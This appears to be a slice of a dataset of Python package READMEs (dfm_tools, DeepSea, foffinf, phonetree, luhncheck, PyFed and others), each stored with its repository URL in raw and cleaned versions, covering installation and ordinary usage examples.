[![pytest-py310](https://github.com/Deltares/dfm_tools/actions/workflows/pytest-py310.yml/badge.svg?branch=main)](https://github.com/Deltares/dfm_tools/actions/workflows/pytest-py310.yml)
[![codecov](https://img.shields.io/codecov/c/github/deltares/dfm_tools.svg?style=flat-square)](https://app.codecov.io/gh/deltares/dfm_tools?displayType=list)
[![generate-documentation](https://github.com/Deltares/dfm_tools/actions/workflows/generate-documentation.yml/badge.svg)](https://github.com/Deltares/dfm_tools/actions/workflows/generate-documentation.yml)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=Deltares_dfm_tools&metric=alert_status)](https://sonarcloud.io/summary/overall?id=Deltares_dfm_tools)
[![Binder](https://mybinder.org/badge_logo.svg)](https://mybinder.org/v2/gh/Deltares/dfm_tools/HEAD)

dfm_tools
=========

A Python package for pre- and postprocessing D-FlowFM model input and output files. Contains convenience functions built on top of other packages like [xarray](https://github.com/pydata/xarray), [xugrid](https://github.com/Deltares/xugrid), [hydrolib-core](https://github.com/Deltares/HYDROLIB-core) and many more.

Information and examples
--------
- [pdf](https://nbviewer.org/github/Deltares/dfm_tools/raw/pptx/docs/dfm_tools.pdf?flush_cache=true) with dfm_tools information, features and examples
- [online documentation](https://htmlpreview.github.io/?https://github.com/Deltares/dfm_tools/blob/main/docs/dfm_tools/index.html) generated from docstrings
- [jupyter notebooks](https://github.com/Deltares/dfm_tools/blob/main/notebooks) with example code
- [use binder](https://mybinder.org/v2/gh/Deltares/dfm_tools/HEAD) to run these notebooks interactively (loading takes a while)
- [github folder](https://github.com/Deltares/dfm_tools/tree/main/tests/examples) with more example scripts

Installation basics
--------
- latest release: ``pip install dfm_tools`` (excludes ``cartopy`` since it is only installable via conda)

Installation recommendation
--------
- download and install Anaconda 64 bit (with Python 3.8 or later) from https://www.anaconda.com/distribution/#download-section
- open Anaconda prompt
- ``conda create --name dfm_tools_env -c conda-forge python=3.8 spyder -y`` (you can also install a newer python version)
- ``conda activate dfm_tools_env``
- ``conda install -c conda-forge git shapely cartopy pyepsg geopandas contextily xarray dask netcdf4 bottleneck xugrid cdsapi pydap -y`` (installs conda-forge requirements)
- ``python -m pip install git+https://github.com/Deltares/dfm_tools`` (this command installs dfm_tools and all required non-conda packages, also use to update)
- long paths error? Check [this Github issue](https://github.com/Deltares/HYDROLIB-core/issues/327#issuecomment-1266534032)
- OpenSSL error? Fix your conda base env by doing [this](https://github.com/conda/conda/issues/11795#issuecomment-1335666474) or maybe [this](https://github.com/conda/conda/issues/11795#issuecomment-1382661765). Let us know if you encounter this issue.
- to remove environment when necessary: ``conda remove -n dfm_tools_env --all``
",deltares/dfm_tools
deepsea,https://github.com/abzargar/DeepSea,0,2904,2904,"# DeepSea 

This work presents a versatile and trainable deep-learning-based software, termed DeepSea, that allows for both segmentation and tracking of single cells in sequences of phase-contrast live microscopy images.


### Datasets

To download our datasets go to https://deepseas.org/datasets/ or:

* Link to [Original annotated dataset](https://drive.google.com/drive/folders/13RhhBAetSWkjySyhJcDqj_FaO09hxkhO?usp=sharing)

* Link to [dataset example for cell segmentation](https://drive.google.com/drive/folders/1gJIkwUQEtut4JCCoUXUcKUWp2gVYxQ9P?usp=sharing)

* Link to [dataset example for cell tracking](https://drive.google.com/drive/folders/17n0Ex8NQS-REB5ZAMlntVnYBnSmZJtLR?usp=sharing)


### Usage
* #### Example of single cell image segmentation

```
from deepsea.test_single_image_segmentation import apply_img_segmentation
import cv2
import os

output_dir='test_results/'
img = cv2.imread(""segmentation_dataset/test/images/A11_z016_c001.png"",0)
label_img,binary_mask,overlay_img,img=apply_img_segmentation(img)
cv2.imwrite(os.path.join(output_dir, 'label_img.png'), label_img)
cv2.imwrite(os.path.join(output_dir, 'binary_mask.png'), binary_mask)
cv2.imwrite(os.path.join(output_dir, 'overlay_img.png'), overlay_img)
cv2.imwrite(os.path.join(output_dir, 'original_img_resized.png'), img)

```
* #### Example of tracking the single set of cell image sequences

```
from deepsea.test_single_set_tracking import apply_cell_tracking
import cv2
import os

single_image_set_dir=""tracking_dataset/test/set_13_MESC/images/""
output_dir='test_results/'
img_list=[]
for img_name in sorted(os.listdir(single_image_set_dir)):
    img_list.append(cv2.imread(os.path.join(single_image_set_dir,img_name),0))

cell_labels,cell_centroids,tracked_imgs=apply_cell_tracking(img_list)
if tracked_imgs:
    for id, img in enumerate(tracked_imgs):
        cv2.imwrite(os.path.join(output_dir, 'img_{:04d}.png'.format(id)), img)
```

### DeepSea GUI Software
Our DeepSea software is available on https://deepseas.org/software/ 
with examples and instructions. DeepSea software is a user-friendly and automated software designed
to enable researchers to 1) load and explore their phase-contrast cell images in a 
high-contrast display, 2) detect and localize cell bodies using the pre-trained DeepSea 
segmentation model, 3) track and label cell lineages across the frame sequences using the pre-trained 
DeepSea tracking model, 4) manually correct the DeepSea models' outputs using user-friendly editing 
options, 5) train a new model with a new cell type dataset if needed, 6) save the results and cell label 
and feature reports on the local system. It employs our latest trained DeepSea models in the segmentation and tracking processes.
It employs our last trained DeepSea models in the segmentation and tracking processes.

### Useful Information
If you have any questions, contact us at abzargar@ucsc.edu.

","# DeepSea 

This work presents a versatile and trainable deep-learning-based software, termed DeepSea, that allows for both segmentation and tracking of single cells in sequences of phase-contrast live microscopy images.


### Datasets

To download our datasets go to https://deepseas.org/datasets/ or:

* Link to [Original annotated dataset](https://drive.google.com/drive/folders/13RhhBAetSWkjySyhJcDqj_FaO09hxkhO?usp=sharing)

* Link to [dataset example for cell segmentation](https://drive.google.com/drive/folders/1gJIkwUQEtut4JCCoUXUcKUWp2gVYxQ9P?usp=sharing)

* Link to [dataset example for cell tracking](https://drive.google.com/drive/folders/17n0Ex8NQS-REB5ZAMlntVnYBnSmZJtLR?usp=sharing)


### Usage
* #### Example of single cell image segmentation

```
from deepsea.test_single_image_segmentation import apply_img_segmentation
import cv2
import os

output_dir='test_results/'
img = cv2.imread(""segmentation_dataset/test/images/A11_z016_c001.png"",0)
label_img,binary_mask,overlay_img,img=apply_img_segmentation(img)
cv2.imwrite(os.path.join(output_dir, 'label_img.png'), label_img)
cv2.imwrite(os.path.join(output_dir, 'binary_mask.png'), binary_mask)
cv2.imwrite(os.path.join(output_dir, 'overlay_img.png'), overlay_img)
cv2.imwrite(os.path.join(output_dir, 'original_img_resized.png'), img)

```
* #### Example of tracking the single set of cell image sequences

```
from deepsea.test_single_set_tracking import apply_cell_tracking
import cv2
import os

single_image_set_dir=""tracking_dataset/test/set_13_MESC/images/""
output_dir='test_results/'
img_list=[]
for img_name in sorted(os.listdir(single_image_set_dir)):
    img_list.append(cv2.imread(os.path.join(single_image_set_dir,img_name),0))

cell_labels,cell_centroids,tracked_imgs=apply_cell_tracking(img_list)
if tracked_imgs:
    for id, img in enumerate(tracked_imgs):
        cv2.imwrite(os.path.join(output_dir, 'img_{:04d}.png'.format(id)), img)
```

### DeepSea GUI Software
Our DeepSea software is available on https://deepseas.org/software/ 
with examples and instructions. DeepSea software is a user-friendly and automated software designed
to enable researchers to 1) load and explore their phase-contrast cell images in a 
high-contrast display, 2) detect and localize cell bodies using the pre-trained DeepSea 
segmentation model, 3) track and label cell lineages across the frame sequences using the pre-trained 
DeepSea tracking model, 4) manually correct the DeepSea models' outputs using user-friendly editing 
options, 5) train a new model with a new cell type dataset if needed, 6) save the results and cell label 
and feature reports on the local system. It employs our latest trained DeepSea models in the segmentation and tracking processes.
It employs our last trained DeepSea models in the segmentation and tracking processes.

### Useful Information
If you have any questions, contact us at abzargar@ucsc.edu.

",abzargar/deepsea
foffinf,https://github.com/facundobatista/foffinf,0,2426,2426,"# foffinf

A way to use stdlib's logging with the new Format Specification Mini-Language.

# What?

We know it's bad to do this:

```python
logger.info(f""The result is {result:05d}"")
```

We should never build the log message ourselves, basically because two situations that are avoided by properly using logging: 
- performance: if the logging level is below INFO (in the case of the example) the resulting message is not really built
- robustness: if `result` happens to not be a number, that example will crash, but the `logging` infrastructure will just present some error message (and everything will continue)

The recommended way is:

```python
logger.info(""The result is %05d"", result)
```

But wait, we're living in the 21st century, are we still using _printf-style_ string formatting?

With `foffinf` we can now write:

```python
logger.info(""The result is {:05d}"", result)
```

Welcome to the future!

![dino](https://github.com/facundobatista/foffinf/blob/main/dino.png?raw=True)

Trust the dino :)


# How to use it

Sadly we can not set up *the whole* logging system in our process to this new format, because most probably we will be using 3rd party libraries that actually have log calls using the old way, and we shall not break them.

So we need to indicate which module (the one we're writing, of course) shall use it. This is done with a `foffinf.formatize` call. As is standard to use the module's name, we can just:

```python
import logging
import foffinf

foffinf.formatize(__name__)
logger = logging.getLogger(__name__)

# ...

logger.info(""The result is {:05d}"", result)
```

Affecting a specific logger module will not affect its parent or any sibling.

```
fofinff.formatize(""mylib.mod1"")

logging.getLogger(""mylib.mod1"")  # affected!
logging.getLogger(""mylib"")  # NOT affected
logging.getLogger(""mylib.mod2"")  # NOT affected 
logging.getLogger()  # NOT affected 
logging.getLogger(""otherlib"")  # NOT affected 
logging.getLogger(""mylib.mod1.submod"")  # NOT affected 
```

Note (in that last line) that by default it will neither affect submodules. To affect all children of a logger tree node:

```
fofinff.formatize(""mylib.mod1"", scatter=True)

logging.getLogger(""mylib.mod1"")  # affected!
logging.getLogger(""mylib"")  # NOT affected
logging.getLogger(""mylib.mod2"")  # NOT affected 
logging.getLogger(""mylib.mod1.submod_a"")  # affected!
logging.getLogger(""mylib.mod1.submod_b"")  # affected!
```


","# foffinf

A way to use stdlib's logging with the new Format Specification Mini-Language.

# What?

We know it's bad to do this:

```python
logger.info(f""The result is {result:05d}"")
```

We should never build the log message ourselves, basically because two situations that are avoided by properly using logging: 
- performance: if the logging level is below INFO (in the case of the example) the resulting message is not really built
- robustness: if `result` happens to not be a number, that example will crash, but the `logging` infrastructure will just present some error message (and everything will continue)

The recommended way is:

```python
logger.info(""The result is %05d"", result)
```

But wait, we're living in the 21st century, are we still using _printf-style_ string formatting?

With `foffinf` we can now write:

```python
logger.info(""The result is {:05d}"", result)
```

Welcome to the future!

![dino](https://github.com/facundobatista/foffinf/blob/main/dino.png?raw=True)

Trust the dino :)


# How to use it

Sadly we can not set up *the whole* logging system in our process to this new format, because most probably we will be using 3rd party libraries that actually have log calls using the old way, and we shall not break them.

So we need to indicate which module (the one we're writing, of course) shall use it. This is done with a `foffinf.formatize` call. As is standard to use the module's name, we can just:

```python
import logging
import foffinf

foffinf.formatize(__name__)
logger = logging.getLogger(__name__)

# ...

logger.info(""The result is {:05d}"", result)
```

Affecting a specific logger module will not affect its parent or any sibling.

```
fofinff.formatize(""mylib.mod1"")

logging.getLogger(""mylib.mod1"")  # affected!
logging.getLogger(""mylib"")  # NOT affected
logging.getLogger(""mylib.mod2"")  # NOT affected 
logging.getLogger()  # NOT affected 
logging.getLogger(""otherlib"")  # NOT affected 
logging.getLogger(""mylib.mod1.submod"")  # NOT affected 
```

Note (in that last line) that by default it will neither affect submodules. To affect all children of a logger tree node:

```
fofinff.formatize(""mylib.mod1"", scatter=True)

logging.getLogger(""mylib.mod1"")  # affected!
logging.getLogger(""mylib"")  # NOT affected
logging.getLogger(""mylib.mod2"")  # NOT affected 
logging.getLogger(""mylib.mod1.submod_a"")  # affected!
logging.getLogger(""mylib.mod1.submod_b"")  # affected!
```


",facundobatista/foffinf
sdc-apis,https://github.com/secretflow/secure-data-capsule-apis,1,52,52,"SecretFlow Data Capsule apis proto generated python
","SecretFlow Data Capsule apis proto generated python
",secretflow/secure-data-capsule-apis
phonetree,https://github.com/leandropls/phonetree,1,3792,3792,"# PhoneTree

PhoneTree is a Python framework for creating text-based menu systems, resembling phone tree systems or rudimentary chatbots. It allows you to easily create menus and actions, manage user input and output, and maintain state between interactions.

## Features

- Simple decorator-based syntax for defining menus and actions
- Optional ""ask"" and ""tell"" callbacks for handling user input and output
- State management for passing data between menus and actions

## Installation

To install PhoneTree, simply use pip:

```
pip install phonetree
```

## Usage

Here's an example of how to use PhoneTree to create a simple menu system:

```python
import phonetree
from phonetree import Ask, Tell

@phonetree.menu()
def main_menu(state: dict) -> dict:
    """"""Main menu.""""""
    return {""interactions"": state.get(""interactions"", 0) + 1}

@main_menu.menu(""First Submenu"")
def first_submenu(state: dict) -> dict:
    """"""First Submenu menu.""""""
    # here goes the code that runs when you enter the submenu
    ...

    return {""interactions"": state.get(""interactions"", 0) + 1}

@first_submenu.action(""Do something"")
def do_something(state: dict, ask: Ask, tell: Tell) -> dict:
    """"""Some action""""""
    anything = ask(""Is there anything you want to say?"")
    print(""user answered: "" + anything)
    tell(""Alright! Thank you!"")
    return {""interactions"": state.get(""interactions"", 0) + 1}

@first_submenu.action(""Do something else"")
def do_something_else(state: dict, ask: Ask, tell: Tell) -> dict:
    """"""Some action""""""
    color = ask(""What's your favorite color?"")
    print(""User said "" + color + "" is their favorite color."")
    tell(""Alright! Nice to know!"")
    return {""interactions"": state.get(""interactions"", 0) + 1, ""favorite_color"": color}

@main_menu.menu(""Second submenu"")
def second_submenu(state: dict, tell: Tell) -> dict:
    """"""Second submenu.""""""
    tell(""Welcome to second submenu!"")
    return {""interactions"": state.get(""interactions"", 0) + 1}
```

### Defining Menus and Actions

To define a menu, simply use the `@phonetree.menu()` decorator on a function. The function should return a dictionary representing the new state of the menu. This state will be passed on to the next menu or action function call.

To define an action within a menu, use the `@menu.action(""Action Name"")` decorator on a function. The function should also return a dictionary representing the new state of the menu.

### Handling User Input and Output

Menu and action functions can take optional ""ask"" and ""tell"" callbacks. The ""ask"" function sends some text to the user and expects an answer, returning the answer as the response of the function call. The ""tell"" function just sends some text to the user and doesn't return anything back. Both functions are recognized by their names in the menu/action functions argument list.

### State Management

Menu and action functions can also take a state variable, which can be called anything (except for ""ask"" and ""tell""). This argument is optional, but if passed, should be the first argument of the function. This argument can receive a state of any type.

The function should return the new state of the menu, which will determine what will be passed on as the state for the next menu/action function call. This state can be any object, including `None`, if the user doesn't need to keep any state.

### Running the Application

To run the application defined by the menu, call the `communicate` method for the menu, passing the state, ask, and tell callbacks:

```python
# communicate(state, ask, tell)
main_menu.communicate({""interactions"": 0}, input, print)
```

This will start the menu system and handle user interactions according to the defined menu and action functions.


## License

PhoneTree is released under the MIT License.
","# PhoneTree

PhoneTree is a Python framework for creating text-based menu systems, resembling phone tree systems or rudimentary chatbots. It allows you to easily create menus and actions, manage user input and output, and maintain state between interactions.

## Features

- Simple decorator-based syntax for defining menus and actions
- Optional ""ask"" and ""tell"" callbacks for handling user input and output
- State management for passing data between menus and actions

## Installation

To install PhoneTree, simply use pip:

```
pip install phonetree
```

## Usage

Here's an example of how to use PhoneTree to create a simple menu system:

```python
import phonetree
from phonetree import Ask, Tell

@phonetree.menu()
def main_menu(state: dict) -> dict:
    """"""Main menu.""""""
    return {""interactions"": state.get(""interactions"", 0) + 1}

@main_menu.menu(""First Submenu"")
def first_submenu(state: dict) -> dict:
    """"""First Submenu menu.""""""
    # here goes the code that runs when you enter the submenu
    ...

    return {""interactions"": state.get(""interactions"", 0) + 1}

@first_submenu.action(""Do something"")
def do_something(state: dict, ask: Ask, tell: Tell) -> dict:
    """"""Some action""""""
    anything = ask(""Is there anything you want to say?"")
    print(""user answered: "" + anything)
    tell(""Alright! Thank you!"")
    return {""interactions"": state.get(""interactions"", 0) + 1}

@first_submenu.action(""Do something else"")
def do_something_else(state: dict, ask: Ask, tell: Tell) -> dict:
    """"""Some action""""""
    color = ask(""What's your favorite color?"")
    print(""User said "" + color + "" is their favorite color."")
    tell(""Alright! Nice to know!"")
    return {""interactions"": state.get(""interactions"", 0) + 1, ""favorite_color"": color}

@main_menu.menu(""Second submenu"")
def second_submenu(state: dict, tell: Tell) -> dict:
    """"""Second submenu.""""""
    tell(""Welcome to second submenu!"")
    return {""interactions"": state.get(""interactions"", 0) + 1}
```

### Defining Menus and Actions

To define a menu, simply use the `@phonetree.menu()` decorator on a function. The function should return a dictionary representing the new state of the menu. This state will be passed on to the next menu or action function call.

To define an action within a menu, use the `@menu.action(""Action Name"")` decorator on a function. The function should also return a dictionary representing the new state of the menu.

### Handling User Input and Output

Menu and action functions can take optional ""ask"" and ""tell"" callbacks. The ""ask"" function sends some text to the user and expects an answer, returning the answer as the response of the function call. The ""tell"" function just sends some text to the user and doesn't return anything back. Both functions are recognized by their names in the menu/action functions argument list.

### State Management

Menu and action functions can also take a state variable, which can be called anything (except for ""ask"" and ""tell""). This argument is optional, but if passed, should be the first argument of the function. This argument can receive a state of any type.

The function should return the new state of the menu, which will determine what will be passed on as the state for the next menu/action function call. This state can be any object, including `None`, if the user doesn't need to keep any state.

### Running the Application

To run the application defined by the menu, call the `communicate` method for the menu, passing the state, ask, and tell callbacks:

```python
# communicate(state, ask, tell)
main_menu.communicate({""interactions"": 0}, input, print)
```

This will start the menu system and handle user interactions according to the defined menu and action functions.


## License

PhoneTree is released under the MIT License.
",leandropls/phonetree
luhncheck,https://github.com/dralshehri/luhncheck,0,2535,2524,"# luhncheck

A Python package to validate identification numbers using the Luhn algorithm
with additional optional checks.

## Overview

The Luhn algorithm or Luhn formula, also known as the ""modulus 10"" or ""mod 10""
algorithm, named after its creator, IBM scientist Hans Peter Luhn, is a simple
checksum formula used to validate a variety of identification numbers, such as:

- US National Provider Identifier numbers.
- Canadian Social Insurance Numbers.
- Saudi Arabia National and Resident ID numbers.
- South African ID numbers.
- Swedish National identification numbers.
- Swedish Corporate Identity Numbers (OrgNr).
- Greek Social Security Numbers (ΑΜΚΑ).
- Credit card numbers.
- IMEI numbers.

The algorithm is in the public domain and is in wide use today. It was designed
to protect against accidental errors. Most credit cards and many government
identification numbers use the algorithm to distinguish valid numbers from
mistyped or otherwise incorrect numbers.

## Features

- Simple API to validate numbers based on the Luhn algorithm.
- Extended validation to cover number length and prefix(es).
- Can validate numbers containing hyphens or spaces.
- Works on Python 3.7+ with zero dependencies.
- Thoroughly tested with 100% test coverage.

## Installation

To install using `pip`, run:

```shell
pip install luhncheck
```

## Usage Examples

```pycon
>>> from luhncheck import is_luhn

>>> # Simple checksum validation
>>> is_luhn(""1101798278"")
True

>>> # Additional check for length (9 digits)
>>> is_luhn(""1101798278"", 9)
False

>>> # Additional checks for prefix (either 1 or 2)
>>> is_luhn(""1101798278"", 10, [""1"", ""2""])
True

>>> # Validate numbers containing hyphens
>>> is_luhn(""01-055102-109831-4"", None, ""01"")
True
```

## API Reference

### <kbd>function</kbd> `is_luhn`

```python
is_luhn(
    number: str,
    length: int | None = None,
    prefix: str | list[str] | None = None
) -> bool
```

Validate checksum and format of an identification number based on the Luhn
algorithm.

**Args:**

- **`number`**: Identification number to validate.
- **`length`**: How many digits the number must contain. (The default is `None`,
  which implies skipping the length check).
- **`prefix`**: Exact digit(s) the number must start with. When a list of digits
  is provided, one of the values must match. (The default is `None`, which
  implies skipping the prefix check).

**Returns:**

- `True` when the number is valid; otherwise, `False`.

## License

This project is licensed under the terms of the MIT license.
","# luhncheck

A Python package to validate identification numbers using the Luhn algorithm
with additional optional checks.

## Overview

The Luhn algorithm or Luhn formula, also known as the ""modulus 10"" or ""mod 10""
algorithm, named after its creator, IBM scientist Hans Peter Luhn, is a simple
checksum formula used to validate a variety of identification numbers, such as:

- US National Provider Identifier numbers.
- Canadian Social Insurance Numbers.
- Saudi Arabia National and Resident ID numbers.
- South African ID numbers.
- Swedish National identification numbers.
- Swedish Corporate Identity Numbers (OrgNr).
- Greek Social Security Numbers (ΑΜΚΑ).
- Credit card numbers.
- IMEI numbers.

The algorithm is in the public domain and is in wide use today. It was designed
to protect against accidental errors. Most credit cards and many government
identification numbers use the algorithm to distinguish valid numbers from
mistyped or otherwise incorrect numbers.

## Features

- Simple API to validate numbers based on the Luhn algorithm.
- Extended validation to cover number length and prefix(es).
- Can validate numbers containing hyphens or spaces.
- Works on Python 3.7+ with zero dependencies.
- Thoroughly tested with 100% test coverage.

## Installation

To install using `pip`, run:

```shell
pip install luhncheck
```

## Usage Examples

```pycon
>>> from luhncheck import is_luhn

>>> # Simple checksum validation
>>> is_luhn(""1101798278"")
True

>>> # Additional check for length (9 digits)
>>> is_luhn(""1101798278"", 9)
False

>>> # Additional checks for prefix (either 1 or 2)
>>> is_luhn(""1101798278"", 10, [""1"", ""2""])
True

>>> # Validate numbers containing hyphens
>>> is_luhn(""01-055102-109831-4"", None, ""01"")
True
```

## API Reference

### function `is_luhn`

```python
is_luhn(
    number: str,
    length: int | None = None,
    prefix: str | list[str] | None = None
) -> bool
```

Validate checksum and format of an identification number based on the Luhn
algorithm.

**Args:**

- **`number`**: Identification number to validate.
- **`length`**: How many digits the number must contain. (The default is `None`,
  which implies skipping the length check).
- **`prefix`**: Exact digit(s) the number must start with. When a list of digits
  is provided, one of the values must match. (The default is `None`, which
  implies skipping the prefix check).

**Returns:**

- `True` when the number is valid; otherwise, `False`.

## License

This project is licensed under the terms of the MIT license.
",dralshehri/luhncheck
pyfed-macos,https://github.com/amirrezasokhankhosh/PyFed,4,5911,5901,"# PyFed

PyFed is an open-source framework for federated learning algorithms. Federated Learning is a subfield of machine learning which trains a global model using one server and multiple clients which contain their separate datasets. 
This approach helps clients with the problems of sharing their local data with a server and the risk of data leakage. PyFed is a straightforward and brief package that allows scientists to try Federated Learning for any model using any dataset. Furthermore, PyFed uses Tensorboard to demonstrate the history of training of each client per round.

PyFed implements FL using sockets, processes, and threads. Simply put, each client will run its particular process and tries to establish a socket connection with the server, which also has its specific process. 
Once initiated, each connection will be handled by one thread of the server's process. Each thread will communicate with its respective client to receive the trained weights per round. 
Once they receive the result of one round, threads will return the weights to the server's process, which will arrive at a new model using the mentioned weights. The server will send the new model to the clients using newly initiated threads.
 
PyFed is mainly based on two classes:
 
- __FL_Server__: which represents the server to which clients communicate in a federated learning problem. The __train()__ function of this class handles socket connections and the FL policy. </br>
- __FL_Client__: which represents each client in a federated learning network. An object of this class handles training procedure any global model on any local data.

Currently, PyFed is limited to FedAvg as its only federated learning policy; however, we will introduce a broader range of configurations for FL experiments in the coming versions.

# Features
PyFed contains two critical classes: FL_Server and FL_Client, which are responsible for server and client actions in a federated learning problem, respectively. </br>
* __FL_Server.train()__ establishes a socket connections with clients and handles weight averaging. In addition, at the end of all rounds a tensorboard session will be started to reveal the efficancy of each client.
* __FL_Server.test()__ will test the final model on the given test data.
* __FL_Client.train()__ will initiate a training session for the client who runs the command. Each client will train the received model on its local dataset.

# Usage
Utilizing PyFed is effortless and time efficient. Following is an example of using this package for the mnist dataset.
## data.py
This is for distributing data among clients and a server.

    import numpy as np
    from sklearn.datasets import fetch_openml

    num_clients = 3
    mnist = fetch_openml(""mnist_784"", version=1)
    X, y = np.array(mnist[""data""]), np.array(mnist[""target""], dtype='int16')
    data_count = len(y) // (num_clients + 1)

    for i in range(num_clients):
        client_i_X, client_i_y = X[data_count*i:data_count*(i + 1)], y[data_count*i:data_count*(i + 1)]
        np.save(f""./data_client_{i+1}.npy"", client_i_X)
        np.save(f""./target_client_{i+1}.npy"", client_i_y)

    server_i_X, server_i_y = X[data_count*num_clients:], y[data_count*num_clients:]
    np.save(f""./data_server.npy"", server_i_X)
    np.save(f""./target_server.npy"", server_i_y)


## server.py
    from pyfed.components import FL_Server
    import numpy as np
    import tensorflow as tf


    model = tf.keras.models.Sequential()
    model.add(tf.keras.layers.InputLayer((784,)))
    model.add(tf.keras.layers.Dense(500, activation='relu'))
    model.add(tf.keras.layers.Dense(1000, activation='relu'))
    model.add(tf.keras.layers.Dense(2000, activation='relu'))
    model.add(tf.keras.layers.Dense(1000, activation='relu'))
    model.add(tf.keras.layers.Dense(500, activation='relu'))
    model.add(tf.keras.layers.Dense(10, activation='softmax'))


    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    lr = 3e-4
    num_clients = 3
    rounds = 2


    model.compile(loss=loss,
                optimizer=optimizer(lr),
                metrics=metrics)

    data = np.load(""./data_server.npy"")
    target = np.load(""./target_server.npy"")


    server = FL_Server(model, num_clients, rounds)
    server.train()
    server.test(data, target, loss, optimizer, lr, metrics)

## client_1.py
    from pyfed.components import FL_Client
    import numpy as np
    import tensorflow as tf

    epochs = 5
    batch_size = 32
    lr = 3e-4

    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    data = np.load(""./data_client_1.npy"")
    target = np.load(""./target_client_1.npy"")

    client1 = FL_Client(""client_1"", data, target)

    client1.train(epochs, batch_size, lr, loss, optimizer, metrics)
## client_2.py
    from pyfed.components import FL_Client
    import numpy as np
    import tensorflow as tf

    epochs = 5
    batch_size = 32
    lr = 3e-4

    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    data = np.load(""./data_client_2.npy"")
    target = np.load(""./target_client_2.npy"")

    client2 = FL_Client(""client_2"", data, target)

    client2.train(epochs, batch_size, lr, loss, optimizer, metrics)
## client_3.py
    from pyfed.components import FL_Client
    import numpy as np
    import tensorflow as tf

    epochs = 5
    batch_size = 32
    lr = 3e-4

    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    data = np.load(""./data_client_3.npy"")
    target = np.load(""./target_client_3.npy"")

    client3 = FL_Client(""client_3"", data, target)

    client3.train(epochs, batch_size, lr, loss, optimizer, metrics)

Now, run the server and clients files separately and simultaneously to get federated learning!


","# PyFed

PyFed is an open-source framework for federated learning algorithms. Federated Learning is a subfield of machine learning which trains a global model using one server and multiple clients which contain their separate datasets. 
This approach helps clients with the problems of sharing their local data with a server and the risk of data leakage. PyFed is a straightforward and brief package that allows scientists to try Federated Learning for any model using any dataset. Furthermore, PyFed uses Tensorboard to demonstrate the history of training of each client per round.

PyFed implements FL using sockets, processes, and threads. Simply put, each client will run its particular process and tries to establish a socket connection with the server, which also has its specific process. 
Once initiated, each connection will be handled by one thread of the server's process. Each thread will communicate with its respective client to receive the trained weights per round. 
Once they receive the result of one round, threads will return the weights to the server's process, which will arrive at a new model using the mentioned weights. The server will send the new model to the clients using newly initiated threads.
 
PyFed is mainly based on two classes:
 
- __FL_Server__: which represents the server to which clients communicate in a federated learning problem. The __train()__ function of this class handles socket connections and the FL policy. 
- __FL_Client__: which represents each client in a federated learning network. An object of this class handles training procedure any global model on any local data.

Currently, PyFed is limited to FedAvg as its only federated learning policy; however, we will introduce a broader range of configurations for FL experiments in the coming versions.

# Features
PyFed contains two critical classes: FL_Server and FL_Client, which are responsible for server and client actions in a federated learning problem, respectively. 
* __FL_Server.train()__ establishes a socket connections with clients and handles weight averaging. In addition, at the end of all rounds a tensorboard session will be started to reveal the efficancy of each client.
* __FL_Server.test()__ will test the final model on the given test data.
* __FL_Client.train()__ will initiate a training session for the client who runs the command. Each client will train the received model on its local dataset.

# Usage
Utilizing PyFed is effortless and time efficient. Following is an example of using this package for the mnist dataset.
## data.py
This is for distributing data among clients and a server.

    import numpy as np
    from sklearn.datasets import fetch_openml

    num_clients = 3
    mnist = fetch_openml(""mnist_784"", version=1)
    X, y = np.array(mnist[""data""]), np.array(mnist[""target""], dtype='int16')
    data_count = len(y) // (num_clients + 1)

    for i in range(num_clients):
        client_i_X, client_i_y = X[data_count*i:data_count*(i + 1)], y[data_count*i:data_count*(i + 1)]
        np.save(f""./data_client_{i+1}.npy"", client_i_X)
        np.save(f""./target_client_{i+1}.npy"", client_i_y)

    server_i_X, server_i_y = X[data_count*num_clients:], y[data_count*num_clients:]
    np.save(f""./data_server.npy"", server_i_X)
    np.save(f""./target_server.npy"", server_i_y)


## server.py
    from pyfed.components import FL_Server
    import numpy as np
    import tensorflow as tf


    model = tf.keras.models.Sequential()
    model.add(tf.keras.layers.InputLayer((784,)))
    model.add(tf.keras.layers.Dense(500, activation='relu'))
    model.add(tf.keras.layers.Dense(1000, activation='relu'))
    model.add(tf.keras.layers.Dense(2000, activation='relu'))
    model.add(tf.keras.layers.Dense(1000, activation='relu'))
    model.add(tf.keras.layers.Dense(500, activation='relu'))
    model.add(tf.keras.layers.Dense(10, activation='softmax'))


    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    lr = 3e-4
    num_clients = 3
    rounds = 2


    model.compile(loss=loss,
                optimizer=optimizer(lr),
                metrics=metrics)

    data = np.load(""./data_server.npy"")
    target = np.load(""./target_server.npy"")


    server = FL_Server(model, num_clients, rounds)
    server.train()
    server.test(data, target, loss, optimizer, lr, metrics)

## client_1.py
    from pyfed.components import FL_Client
    import numpy as np
    import tensorflow as tf

    epochs = 5
    batch_size = 32
    lr = 3e-4

    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    data = np.load(""./data_client_1.npy"")
    target = np.load(""./target_client_1.npy"")

    client1 = FL_Client(""client_1"", data, target)

    client1.train(epochs, batch_size, lr, loss, optimizer, metrics)
## client_2.py
    from pyfed.components import FL_Client
    import numpy as np
    import tensorflow as tf

    epochs = 5
    batch_size = 32
    lr = 3e-4

    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    data = np.load(""./data_client_2.npy"")
    target = np.load(""./target_client_2.npy"")

    client2 = FL_Client(""client_2"", data, target)

    client2.train(epochs, batch_size, lr, loss, optimizer, metrics)
## client_3.py
    from pyfed.components import FL_Client
    import numpy as np
    import tensorflow as tf

    epochs = 5
    batch_size = 32
    lr = 3e-4

    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    data = np.load(""./data_client_3.npy"")
    target = np.load(""./target_client_3.npy"")

    client3 = FL_Client(""client_3"", data, target)

    client3.train(epochs, batch_size, lr, loss, optimizer, metrics)

Now, run the server and clients files separately and simultaneously to get federated learning!


